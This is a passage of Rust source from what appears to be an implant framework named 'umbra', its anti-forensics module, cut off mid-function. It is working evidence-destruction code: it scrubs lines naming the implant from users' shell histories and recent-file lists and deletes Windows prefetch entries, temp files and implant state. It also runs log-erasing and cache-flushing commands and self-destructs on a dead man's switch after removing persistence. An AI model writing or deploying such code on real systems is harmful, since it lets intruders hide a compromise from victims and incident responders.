//! Anti-forensics: the surface of the implant, the wipe, and the end.
//!
//! Every implant leaves something behind.  A file in the state
//! directory, a line in the history of the shell, a prefetch entry, a
//! DNS cache, a line in the journal of the system, the name of the
//! process in the table of the processes.  Some of it belongs to the
//! implant and some of it belongs to the platform, and the difference
//! matters: the artefacts of the implant go away with the implant, and
//! the artefacts of the platform need the tools of the platform.
//!
//! The module has four parts:
//!
//!   * **the survey** -- what is on this host right now, with the size
//!     of every file and the reason it is a trace.  It changes nothing;
//!   * **the wipe** -- the removal of the artefacts the operator named,
//!     with an honest report of what could not be removed and why;
//!   * **the surface** -- what an analyst would find on this machine:
//!     the files, the persistence entries, the process, the journal;
//!   * **the end** -- the self-destruction of the implant: its binary,
//!     its state and its journal, and the machine left the way it was
//!     found.
//!
//! Three rules hold everywhere:
//!
//!   * a wipe never destroys the material of the user that the implant
//!     did not create: the history of the shell is *scrubbed* of the
//!     lines that mention the implant, not deleted;
//!   * the operator chooses the family of the artefacts (`what`), and
//!     the report says which family was touched;
//!   * a limit is reported as a limit.  The MFT and the USN journal of
//!     Windows are not reachable from a process of a user, and the
//!     report says so instead of pretending that the disk is clean.

use crate::task::Context;
use crate::upk::{self, Value};
use std::fs;
use std::path::{Path, PathBuf};

// ---------------------------------------------------------------------------
// The catalogue
// ---------------------------------------------------------------------------

/// What an artefact of the engagement is.
///
/// The catalogue is the knowledge of the platforms: the paths that carry
/// a trace of what the implant did, the tools that remove them and the
/// ones that do not.
#[derive(Clone, Debug)]
pub struct Artefact {
    /// The name of the artefact, the way the operator asks for it.
    pub id: &'static str,
    /// What the operator reads.
    pub label: &'static str,
    /// How it is removed: `file`, `directory`, `glob`, `scrub`,
    /// `command` or `limit`.
    pub kind: &'static str,
    /// The family it belongs to: `state`, `history`, `recent`, `cache`,
    /// `log` or `system`.
    pub family: &'static str,
    /// The platform it belongs to: `any`, `windows`, `macos` or `linux`.
    pub platform: &'static str,
    /// The path of the artefact, with the placeholders `$HOME`,
    /// `$APPDATA`, `$TEMP` and `$SELF`.
    pub path: &'static str,
    /// Why it is a trace.
    pub note: &'static str,
}

/// One artefact, as it is on the machine right now.
#[derive(Clone, Debug)]
pub struct Finding {
    /// The name of the artefact.
    pub id: String,
    /// What the operator reads.
    pub label: String,
    /// How it is removed.
    pub kind: String,
    /// The family it belongs to.
    pub family: String,
    /// The path on this machine.
    pub path: String,
    /// Whether it is there.
    pub present: bool,
    /// How many bytes it holds.
    pub size: u64,
    /// Why it is a trace, or why it could not be removed.
    pub note: String,
}

/// How many entries the catalogue holds.
const CATALOGUE_MAX: usize = 64;

/// The catalogue of the artefacts of the engagement.
///
/// The list is built for the platform the implant runs on: the entries
/// of the other platforms are not even named, so the report of a machine
/// reads like the machine and not like a list of every machine.
pub fn catalogue() -> Vec<Artefact> {
    let mut out: Vec<Artefact> = Vec::new();

    // ---- the artefacts of the implant itself -------------------------
    out.push(Artefact {
        id: "implant.state",
        label: "the state of the implant",
        kind: "directory",
        family: "state",
        platform: "any",
        path: "$HOME/.umbra",
        note: "the persistence entries, the queue of the watchers and the journal",
    });
    out.push(Artefact {
        id: "implant.journal",
        label: "the journal of the engagement",
        kind: "file",
        family: "state",
        platform: "any",
        path: "$HOME/.umbra/journal.state",
        note: "the record of what the implant did on this host",
    });
    out.push(Artefact {
        id: "implant.binary",
        label: "the binary of the implant",
        kind: "self",
        family: "state",
        platform: "any",
        path: "$SELF",
        note: "the file the process runs from",
    });
    out.push(Artefact {
        id: "implant.temp",
        label: "the temporary files of the implant",
        kind: "glob",
        family: "cache",
        platform: "any",
        path: "$TEMP/umbra*",
        note: "the copies the implant makes while it works",
    });

    // ---- the history of the shells -----------------------------------
    // The history of the user is not deleted: the lines that mention
    // the implant are taken out of it and the rest stays.
    for (id, label, path) in [
        ("history.bash", "the history of bash", "$HOME/.bash_history"),
        ("history.zsh", "the history of zsh", "$HOME/.zsh_history"),
        ("history.sh", "the history of sh", "$HOME/.sh_history"),
        ("history.python", "the history of python", "$HOME/.python_history"),
        ("history.psql", "the history of psql", "$HOME/.psql_history"),
        ("history.mysql", "the history of mysql", "$HOME/.mysql_history"),
        ("history.less", "the history of less", "$HOME/.lesshst"),
        ("history.vim", "the history of vim", "$HOME/.viminfo"),
        ("history.node", "the history of node", "$HOME/.node_repl_history"),
        ("history.wget", "the hosts of wget", "$HOME/.wget-hsts"),
    ] {
        out.push(Artefact {
            id,
            label,
            kind: "scrub",
            family: "history",
            // The history of a shell is a history of a shell: a windows
            // host with a git bash has one too.
            platform: "any",
            path,
            note: "the lines that mention the implant are taken out; the rest stays",
        });
    }
    out.push(Artefact {
        id: "history.bash_sessions",
        label: "the sessions of bash",
        kind: "directory",
        family: "history",
        platform: "linux",
        path: "$HOME/.bash_sessions",
        note: "the commands of the sessions that are still open",
    });

    // ---- the recent files --------------------------------------------
    out.push(Artefact {
        id: "recent.xbel",
        label: "the recent files of the desktop",
        kind: "scrub",
        family: "recent",
        platform: "linux",
        path: "$HOME/.local/share/recently-used.xbel",
        note: "the list of the files the user opened",
    });
    out.push(Artefact {
        id: "recent.applications",
        label: "the recent applications",
        kind: "scrub",
        family: "recent",
        platform: "linux",
        path: "$HOME/.local/share/recently-applications.desktop",
        note: "the list of the programs the user ran",
    });
    out.push(Artefact {
        id: "recent.trash",
        label: "the trash of the user",
        kind: "directory",
        family: "recent",
        platform: "linux",
        path: "$HOME/.local/share/Trash",
        note: "the files the user threw away; the implant may be in it",
    });
    out.push(Artefact {
        id: "recent.windows",
        label: "the recent files of windows",
        kind: "glob",
        family: "recent",
        platform: "windows",
        path: "$APPDATA/Microsoft/Windows/Recent/*umbra*",
        note: "the shortcuts the shell keeps for the files the user opened",
    });

    // ---- the caches of the user --------------------------------------
    out.push(Artefact {
        id: "cache.trash.macos",
        label: "the trash of the mac",
        kind: "directory",
        family: "cache",
        platform: "macos",
        path: "$HOME/.Trash",
        note: "the files the user threw away",
    });
    out.push(Artefact {
        id: "cache.logs.macos",
        label: "the logs of the mac",
        kind: "glob",
        family: "log",
        platform: "macos",
        path: "$HOME/Library/Logs/*umbra*",
        note: "the files the implant wrote in the log directory of the user",
    });
    out.push(Artefact {
        id: "cache.caches.macos",
        label: "the caches of the mac",
        kind: "glob",
        family: "cache",
        platform: "macos",
        path: "$HOME/Library/Caches/*umbra*",
        note: "the caches the implant left behind",
    });
    out.push(Artefact {
        id: "cache.umbra",
        label: "the cache of the implant",
        kind: "directory",
        family: "cache",
        platform: "any",
        path: "$HOME/.cache/umbra",
        note: "the cache of the implant, if it has one",
    });

    // ---- the logs of the system --------------------------------------
    out.push(Artefact {
        id: "log.implant",
        label: "the log of the implant",
        kind: "file",
        family: "log",
        platform: "any",
        path: "$HOME/.umbra/umbra.log",
        note: "the file the implant writes its own trace into",
    });
    out.push(Artefact {
        id: "log.prefetch",
        label: "the prefetch of windows",
        kind: "glob",
        family: "log",
        platform: "windows",
        path: "C:/Windows/Prefetch/*UMBRA*",
        note: "the entry windows keeps for every program it ran",
    });
    out.push(Artefact {
        id: "log.unified",
        label: "the unified log of the mac",
        kind: "command",
        family: "log",
        platform: "macos",
        path: "log erase --predicate 'senderImagePath CONTAINS[c] \"umbra\"' 2>/dev/null",
        note: "the entries of the system log that name the implant",
    });
    out.push(Artefact {
        id: "log.journal",
        label: "the journal of the system",
        kind: "limit",
        family: "log",
        platform: "linux",
        path: "journalctl",
        note: "the journal keeps the entries of the implant; a privileged tool has to vacuum it",
    });
    out.push(Artefact {
        id: "log.eventlog",
        label: "the event log of windows",
        kind: "limit",
        family: "log",
        platform: "windows",
        path: "wevtutil",
        note: "the event log keeps the start and the stop of the implant; a privileged tool has to clear it",
    });
    out.push(Artefact {
        id: "log.audit",
        label: "the audit log of linux",
        kind: "limit",
        family: "log",
        platform: "linux",
        path: "auditd",
        note: "auditd keeps every command the implant ran; the log is append only",
    });

    // ---- the caches of the network ------------------------------------
    out.push(Artefact {
        id: "net.dns",
        label: "the dns cache of windows",
        kind: "command",
        family: "system",
        platform: "windows",
        path: "ipconfig /flushdns 2>nul",
        note: "the names the machine resolved while the implant was working",
    });
    out.push(Artefact {
        id: "net.arp",
        label: "the arp cache of windows",
        kind: "command",
        family: "system",
        platform: "windows",
        path: "arp -d * 2>nul",
        note: "the neighbours the machine learned while the implant was working",
    });

    // ---- the limits --------------------------------------------------
    // The things a process of a user cannot reach.  They are in the
    // catalogue so that the report names them: an operator who is told
    // "the disk still carries the trace" can act on it, an operator who
    // is told nothing cannot.
    out.push(Artefact {
        id: "limit.mft",
        label: "the master file table of windows",
        kind: "limit",
        family: "system",
        platform: "windows",
        path: "$MFT",
        note: "the record of every file the implant wrote; only a tool that reads the disk can reach it",
    });
    out.push(Artefact {
        id: "limit.usn",
        label: "the usn journal of windows",
        kind: "limit",
        family: "system",
        platform: "windows",
        path: "$J",
        note: "the journal of the changes of the disk; only a tool that reads the disk can reach it",
    });
    out.push(Artefact {
        id: "limit.amcache",
        label: "the amcache of windows",
        kind: "limit",
        family: "system",
        platform: "windows",
        path: "Amcache.hve",
        note: "the registry hive of the programs that ran; only an administrator can edit it",
    });
    out.push(Artefact {
        id: "limit.utmp",
        label: "the login records of the system",
        kind: "limit",
        family: "system",
        platform: "any",
        path: "utmp",
        note: "the sessions of the user; only an administrator can edit them",
    });
    out.push(Artefact {
        id: "limit.ssd",
        label: "the free blocks of the disk",
        kind: "limit",
        family: "system",
        platform: "any",
        path: "free space",
        note: "the content of a deleted file lives in the free blocks until the disk is written over",
    });

    out.truncate(CATALOGUE_MAX);
    out
}

// ---------------------------------------------------------------------------
// The survey
// ---------------------------------------------------------------------------

/// The artefacts of the engagement, as they are on this machine.
///
/// The survey changes nothing: it looks, it measures, it reports.
pub fn survey(ctx: &Context) -> Vec<Finding> {
    let mut out: Vec<Finding> = Vec::new();
    let markers = markers(ctx);
    for artefact in catalogue() {
        if artefact.platform != "any" && artefact.platform != platform() {
            continue;
        }
        let path = resolve(ctx, artefact.path);
        out.push(finding(artefact, &path, &markers));
    }
    out
}

/// Look at one artefact.
fn finding(artefact: Artefact, path: &str, markers: &[String]) -> Finding {
    let mut note = artefact.note.to_string();
    let mut present = false;
    let mut size = 0u64;
    match artefact.kind {
        "limit" => {
            // A limit is always there and never removable.
            present = true;
        }
        "command" => {
            present = true;
            note = format!("{} (run it to clear it)", note);
        }
        "self" => {
            present = std::env::current_exe().is_ok();
        }
        "glob" => {
            let matches = glob_matches(path);
            present = !matches.is_empty();
            for item in &matches {
                size += file_size(item);
            }
            if !matches.is_empty() {
                note = format!("{} ({} files)", note, matches.len());
            }
        }
        _ => {
            let target = Path::new(path);
            match fs::metadata(target) {
                Ok(meta) => {
                    present = true;
                    if meta.is_dir() {
                        size = dir_size(target);
                    } else {
                        size = meta.len();
                    }
                }
                Err(_) => present = false,
            }
        }
    }
    // A file that mentions the implant is a trace even when the path of
    // the artefact does not: the marker is the name of the implant.
    if artefact.kind == "scrub" && present {
        if let Ok(text) = fs::read_to_string(path) {
            if text.lines().any(|line| mentions(line, markers)) {
                note = format!("{} (the file names the implant)", note);
            }
        }
    }
    Finding {
        id: artefact.id.to_string(),
        label: artefact.label.to_string(),
        kind: artefact.kind.to_string(),
        family: artefact.family.to_string(),
        path: path.to_string(),
        present,
        size,
        note,
    }
}

/// The report of the survey.
pub fn survey_report(findings: &[Finding]) -> String {
    let mut out = String::new();
    let present: Vec<&Finding> = findings.iter().filter(|f| f.present).collect();
    let total: u64 = present.iter().map(|f| f.size).sum();
    out.push_str(&format!(
        "wipe.survey: {} artefacts are on this host, {} bytes\n",
        present.len(),
        total
    ));
    for finding in &present {
        out.push_str(&format!(
            "  {:<22} {:<10} {:>10}  {}\n",
            finding.id, finding.kind, finding.size, finding.path
        ));
    }
    let limits: Vec<&Finding> = present
        .iter()
        .filter(|f| f.kind == "limit")
        .copied()
        .collect();
    if !limits.is_empty() {
        out.push_str(&format!(
            "wipe.survey: {} of them are out of the reach of a process of a user\n",
            limits.len()
        ));
        for finding in limits {
            out.push_str(&format!("  {:<22} {}\n", finding.id, finding.note));
        }
    }
    out
}

// ---------------------------------------------------------------------------
// The wipe
// ---------------------------------------------------------------------------

/// The families of the artefacts.
///
/// The operator names the families and the report says which one was
/// touched: a wipe that removes everything and a wipe that removes the
/// history are not the same thing.
pub const FAMILIES: [&str; 6] = ["state", "history", "recent", "cache", "log", "system"];

/// Remove the artefacts of the engagement.
///
/// `what` names the families (`state`, `history`, `recent`, `cache`,
/// `log`, `system` or `all`), and `dry_run` looks without touching.
pub fn wipe(ctx: &Context, args: &Value) -> Result<(String, Vec<(&'static str, Value)>), String> {
    let wanted = selected(args);
    let dry = args.bool_or("dry_run", false);
    let findings = survey(ctx);
    let markers = markers(ctx);
    let mut removed = 0u64;
    let mut bytes = 0u64;
    let mut failed = 0u64;
    let mut lines: Vec<String> = Vec::new();
    for finding in &findings {
        if !wanted.iter().any(|family| family == &finding.family) {
            continue;
        }
        if !finding.present || finding.kind == "limit" {
            continue;
        }
        match finding.kind.as_str() {
            "command" => {
                if dry {
                    lines.push(format!("  {}: would run {}", finding.id, finding.path));
                    continue;
                }
                let outcome = crate::task::shell(&finding.path, 30);
                let code = outcome.code;
                lines.push(format!(
                    "  {}: ran {} (exit {})",
                    finding.id, finding.path, code
                ));
                if code != 0 {
                    failed += 1;
                }
            }
            "scrub" => {
                let before = fs::read_to_string(&finding.path).unwrap_or_default();
                let kept: Vec<&str> = before
                    .lines()
                    .filter(|line| !mentions(line, &markers))
                    .collect();
                let after = kept.join("\n");
                if before == after {
                    lines.push(format!("  {}: nothing to scrub", finding.id));
                    continue;
                }
                if dry {
                    lines.push(format!(
                        "  {}: would scrub {} lines of {}",
                        finding.id,
                        before.lines().count() - kept.len(),
                        finding.path
                    ));
                    continue;
                }
                match fs::write(&finding.path, after) {
                    Ok(()) => {
                        removed += 1;
                        lines.push(format!("  {}: scrubbed {}", finding.id, finding.path));
                    }
                    Err(e) => {
                        failed += 1;
                        lines.push(format!("  {}: could not be scrubbed: {}", finding.id, e));
                    }
                }
            }
            "glob" => {
                let matches = glob_matches(&finding.path);
                for item in matches {
                    let size = file_size(Path::new(&item));
                    if dry {
                        removed += 1;
                        bytes += size;
                        lines.push(format!("  {}: would remove {}", finding.id, item));
                        continue;
                    }
                    match remove_path(Path::new(&item)) {
                        Ok(()) => {
                            removed += 1;
                            bytes += size;
                            lines.push(format!("  {}: removed {}", finding.id, item));
                        }
                        Err(e) => {
                            failed += 1;
                            lines.push(format!("  {}: could not remove {}: {}", finding.id, item, e));
                        }
                    }
                }
            }
            "self" => {
                lines.push(format!(
                    "  {}: the binary of a running process is removed by wipe.self",
                    finding.id
                ));
            }
            "directory" => {
                let size = dir_size(Path::new(&finding.path));
                if dry {
                    removed += 1;
                    bytes += size;
                    lines.push(format!("  {}: would remove {}", finding.id, finding.path));
                    continue;
                }
                match remove_path(Path::new(&finding.path)) {
                    Ok(()) => {
                        removed += 1;
                        bytes += size;
                        lines.push(format!("  {}: removed {}", finding.id, finding.path));
                    }
                    Err(e) => {
                        failed += 1;
                        lines.push(format!("  {}: could not remove {}: {}", finding.id, finding.path, e));
                    }
                }
            }
            _ => {
                let size = file_size(Path::new(&finding.path));
                if dry {
                    removed += 1;
                    bytes += size;
                    lines.push(format!("  {}: would remove {}", finding.id, finding.path));
                    continue;
                }
                match fs::remove_file(&finding.path) {
                    Ok(()) => {
                        removed += 1;
                        bytes += size;
                        lines.push(format!("  {}: removed {}", finding.id, finding.path));
                    }
                    Err(e) => {
                        failed += 1;
                        lines.push(format!("  {}: could not remove {}: {}", finding.id, finding.path, e));
                    }
                }
            }
        }
    }
    let mut text = String::new();
    text.push_str(&format!(
        "wipe.run: {} artefacts removed, {} bytes, {} failures{}\n",
        removed,
        bytes,
        failed,
        if dry { " (dry run)" } else { "" }
    ));
    for line in &lines {
        text.push_str(line);
        text.push('\n');
    }
    let left = survey(ctx);
    let remaining: Vec<&Finding> = left.iter().filter(|f| f.present && f.kind != "limit").collect();
    text.push_str(&format!(
        "wipe.run: {} artefacts of the engagement are still on this host\n",
        remaining.len()
    ));
    for finding in remaining {
        text.push_str(&format!("  {} {}\n", finding.id, finding.path));
    }
    let extra = vec![
        ("wipe_removed", upk::u(removed)),
        ("wipe_bytes", upk::u(bytes)),
        ("wipe_failed", upk::u(failed)),
        ("wipe_left", upk::u(remaining.len() as u64)),
        ("wipe_dry_run", upk::bool_(dry)),
    ];
    Ok((text, extra))
}

/// Look at the machine after the wipe and say what is left.
pub fn verify(ctx: &Context, _args: &Value) -> Result<(String, Vec<(&'static str, Value)>), String> {
    let findings = survey(ctx);
    let mut text = String::new();
    let left: Vec<&Finding> = findings.iter().filter(|f| f.present).collect();
    let limits: Vec<&Finding> = left.iter().filter(|f| f.kind == "limit").copied().collect();
    let removable: Vec<&&Finding> = left.iter().filter(|f| f.kind != "limit").collect();
    text.push_str(&format!(
        "wipe.verify: {} artefacts are still on this host, {} of them are out of reach\n",
        left.len(),
        limits.len()
    ));
    for finding in &removable {
        text.push_str(&format!("  {:<22} {:<10} {}\n", finding.id, finding.kind, finding.path));
    }
    for finding in &limits {
        text.push_str(&format!("  {:<22} {}\n", finding.id, finding.note));
    }
    if removable.is_empty() {
        text.push_str("wipe.verify: the host carries nothing that the implant can remove\n");
    }
    let extra = vec![
        ("wipe_left", upk::u(removable.len() as u64)),
        ("wipe_limits", upk::u(limits.len() as u64)),
    ];
    Ok((text, extra))
}

// ---------------------------------------------------------------------------
// The surface
// ---------------------------------------------------------------------------

/// What an analyst would find on this machine.
///
/// The report is the inventory of the engagement: the artefacts, the
/// persistence entries, the process, the journal and the network of the
/// implant.  It is the list the operator needs before the wipe, and the
/// list the analyst needs after it.
pub fn surface(ctx: &Context, _args: &Value) -> Result<(String, Vec<(&'static str, Value)>), String> {
    let findings = survey(ctx);
    let mut text = survey_report(&findings);
    text.push_str("forensics.report: the persistence of the implant\n");
    let entries = match crate::persist::list(&Value::Null) {
        Ok(report) => report.entries,
        Err(e) => {
            text.push_str(&format!("forensics.report: the entries could not be read: {e}\n"));
            Vec::new()
        }
    };
    for entry in &entries {
        text.push_str(&format!(
            "  {:<24} {:<10} {}\n",
            field(entry, "technique"),
            field(entry, "state"),
            field(entry, "location")
        ));
    }
    text.push_str(&format!(
        "forensics.report: {} persistence entries are installed\n",
        entries.len()
    ));
    text.push_str("forensics.report: the process of the implant\n");
    let pid = std::process::id();
    let exe = std::env::current_exe()
        .map(|p| p.to_string_lossy().to_string())
        .unwrap_or_default();
    text.push_str(&format!(
        "  pid {} | {} | agent {}\n",
        pid, exe, ctx.agent_id
    ));
    text.push_str(&format!("forensics.report: the server is {}\n", ctx.server));
    let journal = journal_path();
    let journal_size = file_size(&journal);
    let journal_items = journal_items();
    text.push_str(&format!(
        "forensics.report: the journal holds {} entries ({} bytes)\n",
        journal_items.len(),
        journal_size
    ));
    let extra = vec![
        ("forensics_artifacts", upk::u(findings.iter().filter(|f| f.present).count() as u64)),
        ("forensics_bytes", upk::u(findings.iter().map(|f| f.size).sum())),
        ("forensics_persist", upk::u(entries.len() as u64)),
        ("forensics_journal", upk::u(journal_items.len() as u64)),
        ("forensics_pid", upk::u(pid as u64)),
    ];
    Ok((text, extra))
}

// ---------------------------------------------------------------------------
// The timeline
// ---------------------------------------------------------------------------

/// The journal of the engagement.
///
/// The implant writes what it does into a file of its own: the tasks it
/// ran, the persistence it installed, the handshakes it made.  It is a
/// trace like any other, and the wipe removes it -- but while it lives it
/// tells the operator what the implant did on this host, which the
/// server cannot know.
pub fn journal(event: &str, detail: &str) {
    let path = journal_path();
    if let Some(parent) = path.parent() {
        let _ = fs::create_dir_all(parent);
    }
    let line = format!(
        "{}|{}|{}\n",
        now_millis(),
        event.replace('|', "/"),
        detail.replace('|', "/").replace('\n', " ")
    );
    use std::io::Write;
    if let Ok(mut file) = fs::OpenOptions::new()
        .create(true)
        .append(true)
        .open(&path)
    {
        let _ = file.write_all(line.as_bytes());
    }
}

/// Is the journal on?
///
/// The journal is a trace like any other, so it is off until the
/// operator asks for it: an implant that writes a record of its own
/// actions on a host carries evidence that it does not need to carry.
pub fn journal_enabled() -> bool {
    journal_flag().exists()
}

/// Turn the journal on or off.
pub fn journal_set(enabled: bool) -> Result<String, String> {
    let flag = journal_flag();
    if enabled {
        if let Some(parent) = flag.parent() {
            let _ = fs::create_dir_all(parent);
        }
        fs::write(&flag, b"on").map_err(|e| e.to_string())?;
        return Ok("the journal of the engagement is on".to_string());
    }
    match fs::remove_file(&flag) {
        Ok(()) => Ok("the journal of the engagement is off".to_string()),
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => {
            Ok("the journal of the engagement was already off".to_string())
        }
        Err(e) => Err(e.to_string()),
    }
}

/// The flag of the journal.
fn journal_flag() -> PathBuf {
    home().join(".umbra").join("journal.on")
}

/// The entries of the journal.
fn journal_items() -> Vec<(u128, String, String)> {
    let path = journal_path();
    let raw = match fs::read_to_string(&path) {
        Ok(raw) => raw,
        Err(_) => return Vec::new(),
    };
    let mut out = Vec::new();
    for line in raw.lines() {
        if line.trim().is_empty() {
            continue;
        }
        let mut parts = line.splitn(3, '|');
        let at = parts.next().unwrap_or("").parse::<u128>().unwrap_or(0);
        let event = parts.next().unwrap_or("").to_string();
        let detail = parts.next().unwrap_or("").to_string();
        out.push((at, event, detail));
    }
    out
}

/// The timeline of the engagement on this host.
pub fn timeline(_ctx: &Context, args: &Value) -> Result<(String, Vec<(&'static str, Value)>), String> {
    let mut text = String::new();
    // The operator may turn the journal on or off before reading it.
    let wanted = args.str_or("journal", "");
    if wanted == "on" || wanted == "off" {
        match journal_set(wanted == "on") {
            Ok(note) => text.push_str(&format!("forensics.timeline: {note}\n")),
            Err(e) => text.push_str(&format!("forensics.timeline: the journal did not change: {e}\n")),
        }
    }
    let items = journal_items();
    text.push_str(&format!(
        "forensics.timeline: {} entries in the journal of the engagement\n",
        items.len()
    ));
    text.push_str(&format!(
        "forensics.timeline: the journal is {}\n",
        if journal_enabled() { "on" } else { "off" }
    ));
    for (at, event, detail) in &items {
        text.push_str(&format!("  {}  {:<22} {}\n", format_time(*at), event, detail));
    }
    if items.is_empty() {
        text.push_str("forensics.timeline: the journal is empty: the implant wrote nothing\n");
    }
    let extra = vec![("forensics_entries", upk::u(items.len() as u64))];
    Ok((text, extra))
}

// ---------------------------------------------------------------------------
// The end
// ---------------------------------------------------------------------------

/// The self-destruction of the implant.
///
/// The binary of a running process cannot be deleted on windows, so the
/// deletion is scheduled for the next boot; on the other platforms the
/// file goes away a moment after the process ends.  The state and the
/// journal go with it.
pub fn self_destruct(ctx: &Context, args: &Value) -> Result<(String, Vec<(&'static str, Value)>), String> {
    let mut text = String::new();
    let mut removed = 0u64;
    let mut bytes = 0u64;
    // The state of the implant, unless the operator keeps it.
    if !args.bool_or("keep_state", false) {
        let state = home().join(".umbra");
        let size = dir_size(&state);
        match remove_path(&state) {
            Ok(()) => {
                removed += 1;
                bytes += size;
                text.push_str(&format!(
                    "wipe.self: the state of the implant was removed ({} bytes)\n",
                    size
                ));
            }
            Err(e) => text.push_str(&format!("wipe.self: the state could not be removed: {e}\n")),
        }
    }
    // The binary.
    match std::env::current_exe() {
        Ok(exe) => {
            let path = exe.to_string_lossy().to_string();
            match schedule_deletion(&exe) {
                Ok(note) => {
                    text.push_str(&format!("wipe.self: {note}\n"));
                    removed += 1;
                }
                Err(e) => text.push_str(&format!("wipe.self: the binary could not be removed: {e}\n")),
            }
            text.push_str(&format!("wipe.self: the binary is {path}\n"));
        }
        Err(e) => text.push_str(&format!("wipe.self: the binary is unknown: {e}\n")),
    }
    text.push_str(&format!(
        "wipe.self: the implant leaves the machine (agent {})\n",
        ctx.agent_id
    ));
    let extra = vec![
        ("wipe_removed", upk::u(removed)),
        ("wipe_bytes", upk::u(bytes)),
    ];
    Ok((text, extra))
}

/// The end of the engagement, in one task.
///
/// The order matters: the watchers first (they would write into the
/// state that is about to go), then the persistence, then the traces,
/// then the binary, and the report of the verification at the end.
pub fn decommission(ctx: &Context, args: &Value) -> Result<(String, Vec<(&'static str, Value)>), String> {
    let mut text = String::new();
    // ---- the watchers -------------------------------------------------
    crate::senses::stop_watcher();
    text.push_str("decommission: the watchers were stopped\n");
    // ---- the persistence ------------------------------------------------
    match crate::persist::remove(&upk::map(vec![("method", upk::s("all"))])) {
        Ok(report) => {
            text.push_str(&format!(
                "decommission: the persistence entries were taken away\n{}",
                report.text
            ));
        }
        Err(e) => text.push_str(&format!("decommission: the persistence could not be removed: {e}\n")),
    }
    // ---- the traces ------------------------------------------------------
    let (wiped, extra) = wipe(ctx, &Value::Null)?;
    text.push_str(&wiped);
    // ---- the binary --------------------------------------------------------
    let (ended, end_extra) = self_destruct(ctx, args)?;
    text.push_str(&ended);
    // ---- the verification ---------------------------------------------------
    let (verified, verify_extra) = verify(ctx, &Value::Null)?;
    text.push_str(&verified);
    let mut all = extra;
    all.extend(end_extra);
    all.extend(verify_extra);
    Ok((text, all))
}

// ---------------------------------------------------------------------------
// The dead man's switch
// ---------------------------------------------------------------------------

/// The file of the dead man's switch.
///
/// The switch lives in the state directory, so it survives a reboot: a
/// switch that a reboot disarms is not a switch.
fn deadman_path() -> PathBuf {
    home().join(".umbra").join("deadman.state")
}

/// Arm the dead man's switch.
///
/// The implant ends itself when the operator stops checking in: an
/// implant that outlives its engagement is an implant nobody is
/// watching.  Every check-in of the operator renews the window, so the
/// switch fires only when the team goes quiet.
pub fn deadman_arm(
    _ctx: &Context,
    args: &Value,
) -> Result<(String, Vec<(&'static str, Value)>), String> {
    let minutes = args.u64_or("minutes", 0);
    let path = deadman_path();
    if minutes == 0 {
        // The switch is disarmed: the implant stays as long as the
        // operator keeps it.
        return match fs::remove_file(&path) {
            Ok(()) => Ok((
                "wipe.deadman: the dead man's switch is disarmed\n".to_string(),
                vec![("wipe_deadman", upk::u(0))],
            )),
            Err(e) if e.kind() == std::io::ErrorKind::NotFound => Ok((
                "wipe.deadman: the dead man's switch was already disarmed\n".to_string(),
                vec![("wipe_deadman", upk::u(0))],
            )),
            Err(e) => Err(e.to_string()),
        };
    }
    let deadline = now_millis() + u128::from(minutes) * 60_000;
    if let Some(parent) = path.parent() {
        let _ = fs::create_dir_all(parent);
    }
    fs::write(&path, format!("{deadline}|{minutes}")).map_err(|e| e.to_string())?;
    let text = format!(
        "wipe.deadman: the implant ends itself if the operator does not check in for {minutes} minutes\n"
    );
    Ok((
        text,
        vec![
            ("wipe_deadman", upk::u(minutes)),
            ("wipe_deadman_deadline", upk::u((deadline / 1000) as u64)),
        ],
    ))
}

/// Renew the window of the switch.
///
/// Every check-in of the operator is a proof that the engagement is
/// alive, so the deadline moves with it.
pub fn deadman_renew() {
    let (deadline, minutes) = match deadman_state() {
        Some(state) => state,
        None => return,
    };
    let _ = deadline;
    let renewed = now_millis() + u128::from(minutes) * 60_000;
    let _ = fs::write(deadman_path(), format!("{renewed}|{minutes}"));
}

/// Has the switch fired?
pub fn deadman_fired() -> bool {
    match deadman_state() {
        Some((deadline, _)) => now_millis() >= deadline,
        None => false,
    }
}

/// The state of the switch: the deadline and the window.
fn deadman_state() -> Option<(u128, u64)> {
    let text = fs::read_to_string(deadman_path()).ok()?;
    let mut parts = text.trim().split('|');
    let deadline: u128 = parts.next()?.parse().ok()?;
    let minutes: u64 = parts.next().unwrap_or("0").parse().unwrap_or(0);
    Some((deadline, minutes))
}

// ---------------------------------------------------------------------------
// The helpers
// ---------------------------------------------------------------------------

/// The families the operator asked for.
fn selected(args: &Value) -> Vec<String> {
    let asked = args.str_list("what");
    if asked.is_empty() {
        return vec!["state".to_string(), "history".to_string(), "recent".to_string(),
                    "cache".to_string(), "log".to_string()];
    }
    let mut out: Vec<String> = Vec::new();
    for item in asked {
        if item == "all" {
            for family in FAMILIES {
                if !out.iter().any(|f| f == family) {
                    out.push(family.to_string());
                }
            }
            continue;
        }
        if FAMILIES.iter().any(|f| *f == item.as_str()) && !out.iter().any(|f| f == &item) {
            out.push(item);
        }
    }
    if out.is_empty() {
        out.push("state".to_string());
    }
    out
}

/// The words that name the implant in a file of the user.
fn markers(ctx: &Context) -> Vec<String> {
    let mut out = vec![
        "umbra".to_string(),
        ctx.agent_id.clone(),
        ctx.server.clone(),
    ];
    if let Ok(exe) = std::env::current_exe() {
        if let Some(name) = exe.file_name() {
            out.push(name.to_string_lossy().to_string());
        }
    }
    out.retain(|item| !item.is_empty());
    out
}

/// Does the line name the implant?
fn mentions(line: &str, markers: &[String]) -> bool {
    let lower = line.to_lowercase();
    markers.iter().any(|marker| {
        let marker = marker.to_lowercase();
        !marker.is_empty() && lower.contains(&marker)
    })
}

/// Read a string out of the map of an entry.
fn field(value: &Value, key: &str) -> String {
    match value {
        Value::Map(fields) => match fields.get(key) {
            Some(Value::Str(text)) => text.clone(),
            _ => String::new(),
        },
        _ => String::new(),
    }
}

/// The platform of this host.
fn platform() -> &'static str {
    if cfg!(target_os = "windows") {
        "windows"
    } else if cfg!(target_os = "macos") {
        "macos"
    } else {
        "linux"
    }
}

/// The home of the user the implant runs as.
fn home() -> PathBuf {
    std::env::var("HOME")
        .or_else(|_| std::env::var("USERPROFILE"))
        .map(PathBuf::from)
        .unwrap_or_else(|_| PathBuf::from("."))
}

/// The place of the placeholders.
fn resolve(ctx: &Context, path: &str) -> String {
    let mut out = path.to_string();
    if out.contains("$HOME") {
        out = out.replace("$HOME", &home().to_string_lossy());
    }
    if out.contains("$APPDATA") {
        let base = std::env::var("APPDATA")
            .or_else(|_| std::env::var("USERPROFILE"))
            .unwrap_or_default();
        out = out.replace("$APPDATA", &base);
    }
    if out.contains("$TEMP") {
        let base = std::env::var("TEMP")
